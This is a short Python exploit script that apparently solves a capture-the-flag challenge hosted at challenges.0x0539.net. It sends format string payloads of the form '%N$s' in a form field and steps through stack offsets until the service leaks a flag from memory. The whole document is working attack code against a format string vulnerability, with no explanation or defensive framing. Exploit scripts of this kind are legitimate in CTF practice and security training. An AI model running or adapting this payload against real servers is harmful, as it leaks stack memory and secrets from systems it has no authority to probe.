import requests

def bleed_stack(host, port, max_offset=30):
    """
    Exploit a format string vulnerability to bleed stack memory.

    Args:
        host (str): Target server host.
        port (int): Target server port.
        max_offset (int): Maximum stack offset to probe.
    """
    base_url = f"http://{host}:{port}/"
    print(f"[*] Connecting to {base_url}")

    # Use a session to handle cookies
    session = requests.Session()

    # Iterate through offsets to find the flag
    for offset in range(1, max_offset + 1):
        payload = f"%{offset}$s"  # Format string payload for specific stack argument
        print(f"[*] Testing Offset: {offset}, Payload: {payload}")

        # Submit the payload as a guess
        response = session.post(
            base_url, 
            data={"guess": payload}
        )

        # Check response content
        response_text = response.text
        print(f"[*] Response:\n{response_text}")

        # Check if the flag is revealed
        if "FLAG{" in response_text:
            print(f"[!] FLAG FOUND: {response_text.strip()}")
            return  # Exit after finding the flag

    print("[!] Flag not found. Consider increasing max_offset.")

# Target host and port
host = "challenges.0x0539.net"
port = 3002

# Adjust the max_offset as needed
bleed_stack(host, port, max_offset=50)
